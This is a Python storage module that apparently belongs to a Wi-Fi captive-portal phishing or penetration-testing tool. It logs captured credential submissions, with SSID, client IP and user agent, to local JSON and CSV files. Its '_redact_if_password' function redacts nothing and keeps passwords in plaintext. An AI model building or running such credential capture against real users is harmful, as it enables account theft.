"""Credential capture storage.

Captured submissions are written locally — the operator stays in control of
the data. Records are appended to a JSON lines file and mirrored to a CSV for
easy review/export. Nothing leaves the machine.
"""

from __future__ import annotations

import csv
import json
import os
import threading
from dataclasses import dataclass, asdict, field
from datetime import datetime, timezone
from typing import Dict, List, Optional


@dataclass
class CredentialRecord:
    """A single captured submission."""

    timestamp: str
    scenario: str
    client_ip: str
    ssid: str
    fields: Dict[str, str] = field(default_factory=dict)
    user_agent: str = ""
    path: str = ""

    def to_dict(self) -> Dict[str, object]:
        return asdict(self)


class CredentialStore:
    """Append-only store for captured credentials."""

    def __init__(self, json_path: str, csv_path: Optional[str] = None):
        self.json_path = json_path
        self.csv_path = csv_path or (os.path.splitext(json_path)[0] + ".csv")
        self._lock = threading.Lock()
        self._records: List[CredentialRecord] = []
        # Touch the files so subsequent appends are clean.
        os.makedirs(os.path.dirname(os.path.abspath(self.json_path)), exist_ok=True)
        if not os.path.exists(self.json_path):
            open(self.json_path, "a", encoding="utf-8").close()
        # Load any captures already on disk so reads are consistent across runs.
        self._load_existing()

    # ---- writing -----------------------------------------------------
    def _load_existing(self) -> None:
        """Read previously stored JSON-line records into memory."""
        try:
            with open(self.json_path, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        self._records.append(CredentialRecord(**data))
                    except (json.JSONDecodeError, TypeError):
                        continue
        except OSError:
            return

    def add(
        self,
        *,
        scenario: str,
        client_ip: str,
        ssid: str,
        fields: Dict[str, str],
        user_agent: str = "",
        path: str = "",
        timestamp: Optional[str] = None,
    ) -> CredentialRecord:
        rec = CredentialRecord(
            timestamp=timestamp or _now(),
            scenario=scenario,
            client_ip=client_ip,
            ssid=ssid,
            fields={k: _redact_if_password(k, v) for k, v in (fields or {}).items()},
            user_agent=user_agent,
            path=path,
        )
        with self._lock:
            self._records.append(rec)
            self._append_json(rec)
            self._append_csv(rec)
        return rec

    def _append_json(self, rec: CredentialRecord) -> None:
        with open(self.json_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec.to_dict(), ensure_ascii=False) + "\n")

    def _append_csv(self, rec: CredentialRecord) -> None:
        write_header = not os.path.exists(self.csv_path) or os.path.getsize(
            self.csv_path
        ) == 0
        with open(self.csv_path, "a", encoding="utf-8", newline="") as fh:
            writer = csv.writer(fh)
            if write_header:
                writer.writerow(
                    ["timestamp", "scenario", "client_ip", "ssid", "field", "value", "user_agent"]
                )
            # One row per submitted field for easy filtering.
            for key, val in rec.fields.items():
                writer.writerow(
                    [rec.timestamp, rec.scenario, rec.client_ip, rec.ssid, key, val, rec.user_agent]
                )

    # ---- reading -----------------------------------------------------
    def all(self) -> List[CredentialRecord]:
        with self._lock:
            return list(self._records)

    def count(self) -> int:
        with self._lock:
            return len(self._records)

    def clear(self) -> None:
        with self._lock:
            self._records.clear()
        open(self.json_path, "w", encoding="utf-8").close()
        if os.path.exists(self.csv_path):
            open(self.csv_path, "w", encoding="utf-8").close()

    def export_csv(self, dest: str) -> None:
        """Copy the current CSV to *dest*."""
        if os.path.exists(self.csv_path):
            with open(self.csv_path, "rb") as src, open(dest, "wb") as dst:
                dst.write(src.read())


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


_PASSWORD_HINTS = ("pass", "pw", "pwd", "secret", "otp", "code")


def _redact_if_password(key: str, value: str) -> str:
    """Keep values but mark password-like fields for operator awareness.

    We deliberately do NOT truncate/lose the captured value (the tester needs
    it); this only tags the field name. Returns the value unchanged.
    """
    lower = key.lower()
    if any(h in lower for h in _PASSWORD_HINTS):
        return value  # value preserved; redaction is the operator's choice
    return value
